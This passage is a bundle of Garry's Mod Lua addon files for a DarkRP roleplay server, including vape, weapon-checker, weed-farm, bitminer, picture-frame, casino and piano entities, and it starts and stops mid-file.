	newang = Angle(newang.x,newang.y,newang.z) 
	
	pos,ang = LocalToWorld(newpos,newang,pos,ang)
	return pos, ang
end
--PATH addons/vapeswep/lua/weapons/weapon_vape_juicy.lua:
-- weapon_vape_juicy.lua
-- Defines a vape with selectable cloud colors

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

if CLIENT then
	include('weapon_vape/cl_init.lua')
else
	include('weapon_vape/shared.lua')
end

SWEP.PrintName = "Juicy Vape"

SWEP.Instructions = "LMB: Rip Fat Clouds\n (Hold and release)\nRMB: Change Juice Flavor\nReload: Play Sound\n\nThis vape contains a flavor for everyone!"

SWEP.VapeAccentColor = nil

SWEP.VapeID = 20

--Add your own flavors here, obviously
JuicyVapeJuices = {
	{name = "Mountain Dew", color = Color(150,255,100,255)},
	{name = "Cheetos", color = Color(255,180,100,255)},
	{name = "Razzleberry", color = Color(250,100,200,255)},
	{name = "Banana", color = Color(255,255,100,255)},
	{name = "Black Licorice", color = Color(40,40,40,255)},
	{name = "Churro", color = Color(210,180,140,255)},
	{name = "Skittles", color = nil}, --nil means rainbow
}

if SERVER then
	function SWEP:Initialize()
		self.juiceID = 0
		timer.Simple(0.1, function() SendVapeJuice(self, JuicyVapeJuices[self.juiceID+1]) end)
	end

	util.AddNetworkString("VapeTankColor")
	util.AddNetworkString("VapeMessage")
end

function SWEP:SecondaryAttack()
	if SERVER then
		if not self.juiceID then self.juiceID = 0 end
		self.juiceID = (self.juiceID + 1) % (#JuicyVapeJuices)
		SendVapeJuice(self, JuicyVapeJuices[self.juiceID+1])

		--Client hook isn't called in singleplayer...
		if game.SinglePlayer() then	self.Owner:SendLua([[surface.PlaySound("weapons/smg1/switch_single.wav")]]) end
	else
		if IsFirstTimePredicted() then
			surface.PlaySound("weapons/smg1/switch_single.wav")
		end
	end
end

if SERVER then
	function SendVapeJuice(ent, tab)
		local col = tab.color
		if col then
			local min = math.min(col.r,col.g,col.b)*0.8
			col = (Vector(col.r-min, col.g-min, col.b-min)*1.0)/255.0
		else
			--means rainbow tank
			col = Vector(-1,-1,-1)
		end
		net.Start("VapeTankColor")
		net.WriteEntity(ent)
		net.WriteVector(col)
		net.Broadcast()

		if IsValid(ent.Owner) then
			net.Start("VapeMessage")
			net.WriteString("Loaded "..tab.name.." flavor juice")
			net.Send(ent.Owner)
		end
	end
else
	net.Receive("VapeTankColor", function()
		local ent = net.ReadEntity()
		local col = net.ReadVector()
		if IsValid(ent) then ent.VapeTankColor = col end
	end)

	VapeMessageDisplay = ""
	VapeMessageDisplayTime = 0

	net.Receive("VapeMessage", function()
		VapeMessageDisplay = net.ReadString()
		VapeMessageDisplayTime = CurTime()
	end)

	hook.Add("HUDPaint", "VapeDrawJuiceMessage", function()
		local alpha = math.Clamp((VapeMessageDisplayTime+3-CurTime())*1.5,0,1)
		if alpha == 0 then return end

		surface.SetFont("Trebuchet24")
		local w,h = surface.GetTextSize(VapeMessageDisplay)
		draw.WordBox(8, ((ScrW() - w)/2)-8, ScrH() - (h + 24), VapeMessageDisplay, "Trebuchet24", Color(0,0,0,128*alpha), Color(255,255,255,255*alpha))
	end)
end
--PATH gamemodes/darkrp/entities/weapons/weaponchecker/shared.lua:
AddCSLuaFile()

if CLIENT then
    SWEP.PrintName = "Проверка оружия"
    SWEP.Slot = 1
    SWEP.SlotPos = 9
    SWEP.DrawAmmo = false
    SWEP.DrawCrosshair = false
end

SWEP.Author = "DarkRP Developers"
SWEP.Instructions = "Left click to weapon check\nRight click to confiscate weapons\nReload to give back the weapons"
SWEP.Contact = ""
SWEP.Purpose = ""
SWEP.IsDarkRPWeaponChecker = true

SWEP.ViewModelFOV = 62
SWEP.ViewModelFlip = false
SWEP.AnimPrefix  = "rpg"

SWEP.Spawnable = true
SWEP.AdminOnly = true
SWEP.Category = "Other"
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = 0
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = ""

SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = 0
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = ""

DarkRP.hookStub{
    name = "playerWeaponsChecked",
    description = "Called when a player with a weapon checker has checked another player's weapons. Note: Only called when the player looks at the weapons without confiscating. Please see playerWeaponsConfiscated for when weapons are actually confiscated.",
    parameters = {
        {
            name = "checker",
            description = "The player holding the weapon checker.",
            type = "Player"
        },
        {
            name = "target",
            description = "The player whose weapons have been checked.",
            type = "Player"
        },
        {
            name = "weapons",
            description = "The weapons that have been checked.",
            type = "table"
        },
    },
    returns = {},
    realm = "Shared"
}

DarkRP.hookStub{
    name = "playerWeaponsReturned",
    description = "Called when a player with a weapon checker has returned another player's weapons.",
    parameters = {
        {
            name = "checker",
            description = "The player holding the weapon checker.",
            type = "Player"
        },
        {
            name = "target",
            description = "The player whose weapons have been returned.",
            type = "Player"
        },
        {
            name = "weapons",
            description = "The weapons that have been returned.",
            type = "table"
        },
    },
    returns = {},
    realm = "Server"
}

DarkRP.hookStub{
    name = "playerWeaponsConfiscated",
    description = "Called when a player with a weapon checker has confiscated another player's weapons.",
    parameters = {
        {
            name = "checker",
            description = "The player holding the weapon checker.",
            type = "Player"
        },
        {
            name = "target",
            description = "The player whose weapons have been confiscated.",
            type = "Player"
        },
        {
            name = "weapons",
            description = "The weapons that have been confiscated.",
            type = "table"
        },
    },
    returns = {},
    realm = "Server"
}

function SWEP:Initialize()
    self:SetHoldType("normal")
end

function SWEP:SetupDataTables()
    self:NetworkVar("Bool", 0, "IsWeaponChecking")
    self:NetworkVar("Float", 0, "StartCheckTime")
    self:NetworkVar("Float", 1, "EndCheckTime")
    self:NetworkVar("Float", 2, "NextSoundTime")
    self:NetworkVar("Int", 0, "TotalWeaponChecks")
end

function SWEP:Deploy()
    return true
end

function SWEP:DrawWorldModel() end

function SWEP:PreDrawViewModel(vm)
    return true
end

function SWEP:GetStrippableWeapons(ent, callback)
    CAMI.PlayerHasAccess(ent, "DarkRP_GetAdminWeapons", function(access)
        for _, v in ipairs(ent:GetWeapons()) do
            if not v:IsValid() then continue end
            local class = v:GetClass()

            if class == "fakepass" then continue end

            if GAMEMODE.Config.weaponCheckerHideDefault and (table.HasValue(GAMEMODE.Config.DefaultWeapons, class) or
                access and table.HasValue(GAMEMODE.Config.AdminWeapons, class) or
                ent:getJobTable() and ent:getJobTable().weapons and table.HasValue(ent:getJobTable().weapons, class)) then
                continue
            end

            if (GAMEMODE.Config.weaponCheckerHideNoLicense and GAMEMODE.NoLicense[class]) or GAMEMODE.Config.noStripWeapons[class] then continue end

            callback(v)
        end
    end)
end

function SWEP:PrimaryAttack()
    if self:GetIsWeaponChecking() then return end
    self:SetNextPrimaryFire(CurTime() + 0.3)

    self:GetOwner():LagCompensation(true)
    local trace = self:GetOwner():GetEyeTrace()
    self:GetOwner():LagCompensation(false)

    local ent = trace.Entity
    if not IsValid(ent) or not ent:IsPlayer() or ent:GetPos():DistToSqr(self:GetOwner():GetPos()) > 10000 then
        return
    end


   if not IsFirstTimePredicted() then return end
    if SERVER then
        local weps = {}
        local donweps = trace.Entity:getPermWeps()
		local result = {}
        local donresult = {}
	    local data = file.Read( "permweps/"..string.gsub(trace.Entity:SteamID(),":","_")..".txt", "DATA" )
		if (data==nil) then data = "0" end
        self:GetStrippableWeapons(ent, function(wep)
            table.insert(weps, wep)
        end)
        for _, wep in ipairs(weps) do
            if (data:find(wep:GetClass())) then			
                table.insert(donresult, language and(wep:GetPrintName() and language.GetPhrase(wep:GetPrintName())) or wep:GetClass())
            else
                table.insert(result,language and(wep:GetPrintName() and language.GetPhrase(wep:GetPrintName())) or wep:GetClass())
            end
        end

        hook.Call("playerWeaponsChecked", nil, self:GetOwner(), trace.Entity, weps)
	
        result = table.concat(result, ", ")
        donresult = table.concat(donresult, ", ")
        self:GetOwner():ChatPrint("[Обычное оружие]: "..result)
        self:GetOwner():ChatPrint("[Донат оружие]: " ..donresult)
    end
    self:EmitSound("npc/combine_soldier/gear5.wav", 50, 100)
end

-- function SWEP:SecondaryAttack()
    -- if self:GetIsWeaponChecking() then return end
    -- self:SetNextSecondaryFire(CurTime() + 0.3)

    -- self:GetOwner():LagCompensation(true)
    -- local trace = self:GetOwner():GetEyeTrace()
    -- self:GetOwner():LagCompensation(false)

    -- local ent = trace.Entity
    -- if not IsValid(ent) or not ent:IsPlayer() or ent:GetPos():DistToSqr(self:GetOwner():GetPos()) > 10000 then
        -- return
    -- end

    -- self:SetIsWeaponChecking(true)
    -- self:SetStartCheckTime(CurTime())
    -- self:SetEndCheckTime(CurTime() + util.SharedRandom("DarkRP_WeaponChecker" .. self:EntIndex() .. "_" .. self:GetTotalWeaponChecks(), 5, 10))
    -- self:SetTotalWeaponChecks(self:GetTotalWeaponChecks() + 1)

    -- self:SetNextSoundTime(CurTime() + 0.5)

    -- if CLIENT then
        -- self.Dots = ""
        -- self.NextDotsTime = CurTime() + 0.5
    -- end
-- end

-- function SWEP:Reload()
    -- if CLIENT or CurTime() < (self.NextReloadTime or 0) then return end
    -- self.NextReloadTime = CurTime() + 1

    -- local trace = self:GetOwner():GetEyeTrace()

    -- local ent = trace.Entity
    -- if not IsValid(ent) or not ent:IsPlayer() or ent:GetPos():DistToSqr(self:GetOwner():GetPos()) > 10000 then
        -- return
    -- end

    -- if not ent.ConfiscatedWeapons then
        -- DarkRP.notify(self:GetOwner(), 1, 4, DarkRP.getPhrase("no_weapons_confiscated", ent:Nick()))
        -- return
    -- else
        -- for _, v in pairs(ent.ConfiscatedWeapons) do
            -- local wep = ent:Give(v.class)
            -- ent:RemoveAllAmmo()
            -- ent:SetAmmo(v.primaryAmmoCount, v.primaryAmmoType, false)
            -- ent:SetAmmo(v.secondaryAmmoCount, v.secondaryAmmoType, false)

            -- wep:SetClip1(v.clip1)
            -- wep:SetClip2(v.clip2)

        -- end
        -- DarkRP.notify(self:GetOwner(), 2, 4, DarkRP.getPhrase("returned_persons_weapons", ent:Nick()))

        -- hook.Call("playerWeaponsReturned", nil, self:GetOwner(), trace.Entity, trace.Entity.ConfiscatedWeapons)
        -- ent.ConfiscatedWeapons = nil
    -- end
-- end

function SWEP:Holster()
    self:SetIsWeaponChecking(false)
    self:SetNextSoundTime(0)
    return true
end

function SWEP:Succeed()
    if not IsValid(self:GetOwner()) then return end
    self:SetIsWeaponChecking(false)

    if CLIENT then return end
    local result = {}
    local stripped = {}
    local trace = self:GetOwner():GetEyeTrace()
    if not IsValid(trace.Entity) or not trace.Entity:IsPlayer() then return end
    self:GetStrippableWeapons(trace.Entity, function(wep)
        trace.Entity:StripWeapon(wep:GetClass())
        table.insert(result, wep:GetClass())
        stripped[wep:GetClass()] = {
            class = wep:GetClass(),
            primaryAmmoCount = trace.Entity:GetAmmoCount(wep:GetPrimaryAmmoType()),
            primaryAmmoType = wep:GetPrimaryAmmoType(),
            secondaryAmmoCount = trace.Entity:GetAmmoCount(wep:GetSecondaryAmmoType()),
            secondaryAmmoType = wep:GetSecondaryAmmoType(),
            clip1 = wep:Clip1(),
            clip2 = wep:Clip2()
        }
    end)
    result = table.concat(result, ", ")

    if not trace.Entity.ConfiscatedWeapons then
        if next(stripped) ~= nil then trace.Entity.ConfiscatedWeapons = stripped end
    else
        -- Merge stripped weapons into confiscated weapons
        for k,v in pairs(stripped) do
            if trace.Entity.ConfiscatedWeapons[k] then continue end

            trace.Entity.ConfiscatedWeapons[k] = v
        end
    end

    hook.Call("playerWeaponsConfiscated", nil, self:GetOwner(), trace.Entity, trace.Entity.ConfiscatedWeapons)

    if result == "" then
        self:GetOwner():ChatPrint(DarkRP.getPhrase("no_illegal_weapons", trace.Entity:Nick()))
        self:EmitSound("npc/combine_soldier/gear5.wav", 50, 100)
        self:SetNextSoundTime(CurTime() + 1)
    else
        self:EmitSound("ambient/energy/zap1.wav", 50, 100)
        self:GetOwner():ChatPrint(DarkRP.getPhrase("confiscated_these_weapons"))
        if string.len(result) >= 126 then
            local amount = math.ceil(string.len(result) / 126)
            for i = 1, amount, 1 do
                self:GetOwner():ChatPrint(string.sub(result, (i-1) * 126, i * 126 - 1))
            end
        else
            self:GetOwner():ChatPrint(result)
        end
        self:SetNextSoundTime(1)
    end
end

function SWEP:Fail()
    self:SetIsWeaponChecking(false)
    self:SetHoldType("normal")
    self:SetNextSoundTime(0)
end

function SWEP:Think()
    if self:GetIsWeaponChecking() and self:GetEndCheckTime() ~= 0 then
        self:GetOwner():LagCompensation(true)
        local trace = self:GetOwner():GetEyeTrace()
        self:GetOwner():LagCompensation(false)
        if not IsValid(trace.Entity) or trace.HitPos:DistToSqr(self:GetOwner():GetShootPos()) > 10000 or not trace.Entity:IsPlayer() then
            self:Fail()
        end
        if self:GetEndCheckTime() <= CurTime() then
            self:Succeed()
        end
    end
    if self:GetNextSoundTime() ~= 0 and CurTime() >= self:GetNextSoundTime() then
        if self:GetIsWeaponChecking() then
            self:SetNextSoundTime(CurTime() + 1)
            self:EmitSound("npc/combine_soldier/gear5.wav", 100, 100)
        else
            self:SetNextSoundTime(1)
          --  self:EmitSound("npc/combine_soldier/gear5.wav", 50, 100)
        end
    end
    if CLIENT and self.NextDotsTime and CurTime() >= self.NextDotsTime then
        self.NextDotsTime = CurTime() + 1
        self.Dots = self.Dots or ""
        local len = string.len(self.Dots)
        local dots = {
            [0] = ".",
            [1] = "..",
            [2] = "...",
            [3] = ""
        }
        self.Dots = dots[len]
    end
end

function SWEP:DrawHUD()
    if self:GetIsWeaponChecking() and self:GetEndCheckTime() ~= 0 then
        self.Dots = self.Dots or ""
        local w = ScrW()
        local h = ScrH()
        local x, y, width, height = w / 2 - w / 10, h / 2, w / 5, h / 15
        local time = self:GetEndCheckTime() - self:GetStartCheckTime()
        local curtime = CurTime() - self:GetStartCheckTime()
        local status = math.Clamp(curtime / time, 0, 1)
        local BarWidth = status * (width - 16)
        local cornerRadius = math.Min(8, BarWidth / 3 * 2 - BarWidth / 3 * 2 % 2)

        draw.RoundedBox(8, x, y, width, height, Color(10, 10, 10, 120))
        draw.RoundedBox(cornerRadius, x + 8, y + 8, BarWidth, height - 16, Color(0, 0 + (status * 255), 255 - (status * 255), 255))
        draw.DrawNonParsedSimpleText('Изымаем оружие' .. self.Dots, "Trebuchet24", w / 2, y + height / 2, Color(255, 255, 255, 255), 1, 1)
    end
end
--PATH addons/zeros_weedfarm/lua/weapons/zwf_bong/cl_init.lua:
include("shared.lua")
SWEP.DrawAmmo = false
SWEP.DrawCrosshair = true -- Do you want the SWEP to have a crosshair?
local wMod = ScrW() / 1920
local hMod = ScrH() / 1080

function SWEP:Initialize()
	self:SetHoldType(self.HoldType)
	self.LastWeed = -1
	self.LastWeedAmount = -1
	self.WeedLevel = -1
	self.WeedName = "nil"

end

function SWEP:DrawHUD()
	local weed = self:GetWeedID()

	if self.LastWeed ~= weed then
		self.LastWeed = weed


		if self.LastWeed ~= -1 then
			self.WeedLevel = self:GetWeed_Amount()
			self.WeedName = self:GetWeed_Name()
		end
	end

	local weed_amount = self:GetWeed_Amount()
	if self.LastWeedAmount ~= weed_amount then
		self.LastWeedAmount = weed_amount
	end


	if self.LastWeed ~= -1 then


		local bongData = zwf.config.Bongs.items[self.BongID]


		self.WeedLevel = self.WeedLevel - 2 * FrameTime()
		self.WeedLevel = math.Clamp(self.WeedLevel, self.LastWeedAmount, bongData.hold_amount)


		local width = (315 / bongData.hold_amount) * self.WeedLevel

		draw.RoundedBox(5, 800 * wMod, 1027 * hMod, 320 * wMod, 45 * hMod, zwf.default_colors["gray02"])
		draw.RoundedBox(5, 803 * wMod, 1029 * hMod, width * wMod, 41 * hMod, zwf.config.Plants[self.LastWeed].color)
		draw.SimpleText(self.WeedName, "zwf_wateringcan_font01", 960 * wMod, 1065 * hMod, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
	end
end

function SWEP:Think()
	zwf.f.LoopedSound(self, "zwf_bong_loop", self:GetIsSmoking())
end

function SWEP:SecondaryAttack()

	self:SetNextSecondaryFire(CurTime() + 1)
end

function SWEP:PrimaryAttack()

	self:SetNextPrimaryFire(CurTime() + 1)
end

function SWEP:StopLoopedSound()
	self:StopSound("zwf_bong_loop")
	zwf.f.StopLoopedSound(self)
end

function SWEP:Holster()
	self:StopLoopedSound()
end

function SWEP:OnRemove()
	self:StopLoopedSound()
end

--PATH addons/zeros_weedfarm/lua/weapons/zwf_sniffer/shared.lua:
if SERVER then
	AddCSLuaFile("shared.lua")
end

SWEP.PrintName = "Weed Sniffer" // The name of your SWEP
SWEP.Author = "ZeroChain" // Your name
SWEP.Instructions = "LMB - Sniff for weed." // How do people use your SWEP?
SWEP.Contact = "https://www.gmodstore.com/users/ZeroChain" // How people should contact you if they find bugs, errors, etc
SWEP.Purpose = "Used by the Police to detect weed." // What is the purpose of the SWEP?
SWEP.AdminSpawnable = true // Is the SWEP spawnable for admins?
SWEP.Spawnable = true // Can everybody spawn this SWEP? - If you want only admins to spawn it, keep this false and admin spawnable true.

SWEP.ViewModelFOV = 62
SWEP.ViewModelFlip = false
SWEP.AnimPrefix	 = "rpg"

SWEP.WorldModel =  "models/weapons/w_pistol.mdl"

if CLIENT then
	SWEP.WepSelectIcon = surface.GetTextureID("zerochain/zwf/vgui/zwf_swep_sniffer")
end

SWEP.AutoSwitchTo = true // When someone picks up the SWEP, should it automatically change to your SWEP?
SWEP.AutoSwitchFrom = false // Should the weapon change to the a different SWEP if another SWEP is picked up?

SWEP.Slot = 3 // Which weapon slot you want your SWEP to be in? (1 2 3 4 5 6)
SWEP.SlotPos = 4 // Which part of that slot do you want the SWEP to be in? (1 2 3 4 5 6)

SWEP.FiresUnderwater = false // Does your SWEP fire under water?
SWEP.Weight = 5 // Set the weight of your SWEP.
SWEP.DrawCrosshair = true // Do you want the SWEP to have a crosshair?
SWEP.Category = "Zeros GrowOP"
SWEP.DrawAmmo = false // Does the ammo show up when you are using it? True / False
SWEP.base = "weapon_base" //What your weapon is based on.

SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = ""

SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Primary.Ammo = ""

SWEP.UseHands = true

function SWEP:Initialize()
	self:SetWeaponHoldType("normal")
end

function SWEP:DrawWorldModel() end

function SWEP:PreDrawViewModel(vm)
	return true
end

function SWEP:Holster()
	if not SERVER then return true end

	self.Owner:DrawViewModel(true)
	self.Owner:DrawWorldModel(true)

	return true
end

--PATH addons/mod_bitminers2/lua/entities/bm2_extention_lead/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"

ENT.PrintName = "Extention Lead"
ENT.Spawnable = true
ENT.Category = "Bitminers 2"

function ENT:SetupDataTables()
	self:NetworkVar("Entity", 0, "owning_ent")
end
--PATH addons/mod_bitminers2/lua/entities/bm2_generator/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"

ENT.PrintName = "Generator"
ENT.Spawnable = true
ENT.Category = "Bitminers 2"

function ENT:SetupDataTables()
	self:NetworkVar( "Bool", 1, "IsOn" )
	self:NetworkVar( "Bool", 2, "ShowToMuchPowerWarning")
	self:NetworkVar( "Bool", 3, "ShowNoFuelWarning")
	self:NetworkVar( "Int", 1, "FuelLevel")
	self:NetworkVar( "Float", 2, "PowerConsumpsion")
	self:NetworkVar("Entity", 0, "owning_ent")
end
--PATH addons/mod_bitminers2/lua/entities/bm2_power_lead/cl_init.lua:
include("shared.lua")

function ENT:Initialize()

end

function ENT:Draw()
	self:DrawModel()
end
--PATH addons/the_cocaine_factory/lua/entities/cocaine_gas/cl_init.lua:
include( "shared.lua" )

function ENT:Initialize()
end

function ENT:Draw()
	self:DrawModel()
end		
--PATH addons/the_cocaine_factory/lua/entities/cocaine_water/cl_init.lua:
include( "shared.lua" )

function ENT:Draw()
	self:DrawModel()		
end		
--PATH addons/111mod/lua/entities/ent_picture/cl_init.lua:
include'shared.lua'
cvar.Register'enable_pictureframes':SetDefault(true):AddMetadata('State', 'RPMenu'):AddMetadata('Menu', 'Отображение Картин')

timer.Simple( 2.5 , function() texture.SetProxy ("https://gmod-api.superiorservers.co/api/imageproxy/?url=%s&width=%i&height=%i&format=%s") end )


function ENT:RenderTexture()
    self.Rendering = true
	texture.Create(self:GetURL()):SetSize(1014, 1014):SetFormat(self:GetURL():sub(-3) == 'jpg' and 'jpg' or 'png'):EnableProxy(true):Download(self:GetURL(), function()
        if IsValid(self) then
            self.Rendering = false
            self.LastURL = self:GetURL()
        end
    end, function()
        if IsValid(self) then
            self.Rendering = false
        end
    end)
end

function ENT:GetTexture()
    return texture.Get(self:GetURL())
end

function ENT:Draw()
    self:DrawModel()
    if (cvar.GetValue('enable_pictureframes') == false) or (not self:InSight()) then return end
    if ((not self:GetTexture()) or (self:GetURL() ~= self.LastURL)) and (not self.Rendering) then
        self:RenderTexture()
    end

    local ang = self:GetAngles()
    ang:RotateAroundAxis(ang:Up(), 90)
    ang:RotateAroundAxis(ang:Forward(), 0)
    local scale = self:GetModelScale()
    local s = 1024 * scale
    local off = -(s * 0.5)
    cam.Start3D2D(self:GetPos() + (self:GetUp() * 1.55), ang, 0.04635)
    surface.SetDrawColor(25, 25, 25, 255)
    surface.DrawRect(off, off, s, s)

    if self.Rendering then
        local t = SysTime() * 5
        draw.NoTexture()
        surface.SetDrawColor(255, 255, 255, 255)
        surface.DrawArc(off + (s * 0.5), off + (s * 0.5), 111, 116, t * 180, t * 180 + 180, 10)
    elseif self:GetTexture() then
        surface.SetDrawColor(255, 255, 255, 255)
        surface.SetMaterial(self:GetTexture())
        surface.DrawTexturedRect(off, off, s, s)
    end

    cam.End3D2D()
end

local all_patterns = {"^https?://.*%.jpg", "^https?://.*%.png"}

local function IsValidURL(url)
    for _, pattern in ipairs(all_patterns) do
        if string.match(url, pattern) then return true end
    end
end

local fr

net.Receive('rp.OpenImageWindow', function()
    local set
    local text
    local ava

    if IsValid(fr) then
        fr:Close()
    end
	
	
    fr = ui.Create('ui_frame', function(self)
        self:SetSize(520, 120)
        self:SetTitle('Изменить')
        self:MakePopup()
        self:Center()

        function self:Think()
            if IsValid(set) and IsValid(text) and IsValidURL(text:GetValue()) then
                set:SetDisabled(false)
            else
                set:SetDisabled(true)
            end
        end
    end)

    text = ui.Create('DTextEntry', function(self, p)
        self:SetPos(5, 60)
        self:SetSize(p:GetWide() - 10, 25)

        self.OnEnter = function(s)
            set:DoClick()
        end
    end, fr)

    ui.Create('DLabel', function(self, p)
        self:SetText('Расширения .jpg и .png! За нецензуру бан.\nФормат ссылки: http://yourdomain.com/image.png.')
        self:SetFont('ui.24')
        self:SetTextColor(ui.col.Close)
        self:SizeToContents()
        self:SetPos((p:GetWide() - self:GetWide()) / 2, 32)
    end, fr)

    set = ui.Create('DButton', function(self, p)
        self:SetText('Изменить')
        self:SetPos(5, 90)
        self:SetSize(p:GetWide() / 2 - 7.5, 25)

        function self:DoClick()
            p:Close()
            RunConsoleCommand('setimage', text:GetValue())
        end
    end, fr)
end)
--PATH addons/truefishing/lua/entities/fishing_pot_large/shared.lua:
ENT.Type 			= "anim"
ENT.Base 			= "base_anim"
ENT.PrintName		= "Big Fishing Pot"
ENT.Author			= "Tomasas"


function ENT:GetSpace()
	local space = 0
	
	for i=1, FISH_HIGHNUMBER do
		if self.FishTable[i] then
			space = space + self.FishTable[i]
		end
	end
	return space
end

--PATH addons/truefishing/lua/entities/fishing_rod_hook/shared.lua:
ENT.Type 			= "anim"
ENT.Base 			= "base_anim"
ENT.PrintName		= "Fish Hook"
ENT.Author			= "Tomasas"

--PATH addons/casino/lua/entities/gambling_machine_fiftyfifty/cl_init.lua:
include('shared.lua')
ENT.BackgroundMaterial = Material 'gambitrp/entities/fiftyfifty.png'

function ENT:DrawScreen(x,y,w,h)
	local rollY = y + 343

	draw.SimpleText(self:GetPlayerRoll(), 'rp.GamblingMachines', x + 335, rollY, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

	draw.SimpleText(self:GetHouseRoll(), 'rp.GamblingMachines', x + 827, rollY, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

	draw.SimpleText(DarkRP.formatMoney(self:Getprice()), 'rp.GamblingMachines', x + (w * 0.5), y + 627, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	-- surface.SetFont('3d2d')
	
	-- surface.SetTextColor(255,255,255)
	-- surface.SetTextPos(-475, -1375)
	-- playerr = Lerp(.1, playerr or 0, self:GetPlayerRoll() or 0)
	-- surface.DrawText(math.Round(playerr))

	-- surface.SetTextPos(225, -1375)
	-- house = Lerp(.1, house or 0, self:GetHouseRoll() or 0)
	-- surface.DrawText(math.Round(house))
	
	-- draw.SimpleText(DarkRP.formatMoney(self:Getprice()), '3d2d', 0, -1160, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
end

function ENT:Draw(callback) -- We're using the same model for all machines right now, save some lines
	self:DrawModel()

	local pos = self:GetPos()
	local ang = self:GetAngles()

	if (not self:InDistance(150000)) then return end

	local inService = self:GetInService()
	local isPayingOut = self:GetIsPayingOut()

	ang:RotateAroundAxis(ang:Up(), 90)
	ang:RotateAroundAxis(ang:Forward(), 84.16463)

	cam.Start3D2D(self:GetPos() - (self:GetForward() * -1.954) - (self:GetUp() * -44.485) - (self:GetRight() * 0.25), ang, 0.026)
		local x, y, w, h = -580.5, -403, 1161, 806

		if (not inService) then
			surface.SetDrawColor(0, 0, 0, 255)
			surface.DrawRect(x, y, w, h)

			draw.SimpleText('Выключен...', 'rp.GamblingMachines', 0, 0, ui.col.DarkRed, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		else
			self:DrawScreen(x, y, w, h)
		end

		if isPayingOut then
			surface.SetDrawColor(0, 0, 0)
			surface.DrawRect(x, y, w, 230)

			local t = SysTime() * 5
			draw.NoTexture()
			surface.SetDrawColor(255, 255, 255)
			surface.DrawArc(-20, y + 75, 41, 46, t * 180, t * 180 + 180, 5)
			draw.SimpleText('Транзакция...', 'rp.GamblingMachines', 0, y + 130, ui.col.DarkGreen, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
		end

	cam.End3D2D()
end

--PATH addons/rp_advdupe2/lua/entities/gmod_contr_spawner/cl_init.lua:
include("shared.lua")

function ENT:Draw()
	self.BaseClass.Draw(self)
	self.Entity:DrawModel()
end

--PATH addons/pianino/lua/entities/gmt_instrument_piano/shared.lua:
ENT.Base			= "gmt_instrument_base"
ENT.Type			= "anim"
ENT.PrintName		= "Playable Piano"
ENT.Author			= "MacDGuy"
ENT.Contact			= "http://www.gmtower.org"
ENT.Purpose			= "A fully playable piano!"
ENT.Category		= "Fun + Games"
ENT.Spawnable		= true
ENT.AdminSpawnable 	= true

ENT.Model		= Model( "models/fishy/furniture/piano.mdl" )
ENT.SoundDir	= "GModTower/lobby/instruments/piano/"

local darker = Color( 100, 100, 100, 150 )
ENT.Keys = {
	[KEY_A] = { Sound = "a15", Material = "left", Label = "A", X = 19, Y = 86 },
	[KEY_S] = { Sound = "a16", Material = "middle", Label = "S", X = 44, Y = 86 },
	[KEY_D] = { Sound = "a17", Material = "right", Label = "D", X = 68, Y = 86 },
	[KEY_F] = { Sound = "a18", Material = "left", Label = "F", X = 94, Y = 86 },
	[KEY_G] = { Sound = "a19", Material = "leftmid", Label = "G", X = 119, Y = 86 },
	[KEY_H] = { Sound = "a20", Material = "rightmid", Label = "H", X = 144, Y = 86 },
	[KEY_J] = { Sound = "a21", Material = "right", Label = "J", X = 169, Y = 86 },
	[KEY_K] = { Sound = "a22", Material = "left", Label = "K", X = 194, Y = 86 },
	[KEY_L] = { Sound = "a23", Material = "middle", Label = "L", X = 219, Y = 86 },
	[KEY_SEMICOLON] = { Sound = "a24", Material = "right", Label = ":", X = 244, Y = 86 },
	[KEY_APOSTROPHE] = { Sound = "a25", Material = "full", Label = "'", X = 269, Y = 86 },

	[KEY_W] = { Sound = "b11", Material = "top",  Label = "W", X = 33, Y = 31, TextX = 7, TextY = 90, Color = darker },
	[KEY_E] = { Sound = "b12", Material = "top", Label = "E", X = 64, Y = 31, TextX = 7, TextY = 90, Color = darker },
	[KEY_T] = { Sound = "b13", Material = "top", Label = "T", X = 108, Y = 31, TextX = 7, TextY = 90, Color = darker },
 	[KEY_Y] = { Sound = "b14", Material = "top", Label = "Y", X = 136, Y = 31, TextX = 7, TextY = 90, Color = darker },
 	[KEY_U] = { Sound = "b15", Material = "top", Label = "U", X = 164, Y = 31, TextX = 7, TextY = 90, Color = darker },
	[KEY_O] = { Sound = "b16",	Material = "top", Label = "O", X = 208, Y = 31, TextX = 7, TextY = 90, Color = darker },
	[KEY_P] = { Sound = "b17", Material = "top", Label = "P", X = 239, Y = 31, TextX = 7, TextY = 90, Color = darker },
}

ENT.AdvancedKeys = {
	[KEY_1] =
	{
		Sound = "a1", Material = "left", Label = "1", X = 19, Y = 86,
		Shift = { Sound = "b1", Material = "top", Label = "!", X = 33, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_2] =
	{
		Sound = "a2", Material = "middle", Label = "2", X = 44, Y = 86,
		Shift = { Sound = "b2", Material = "top", Label = "@", X = 64, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_3] = { Sound = "a3", Material = "right", Label = "3", X = 69, Y = 86 },
	[KEY_4] =
	{
		Sound = "a4", Material = "left", Label = "4", X = 94, Y = 86,
		Shift = { Sound = "b3", Material = "top", Label = "$", X = 108, Y = 31, TextX = 7, TextY = 90, Color = darker },
	},
	[KEY_5] =
	{
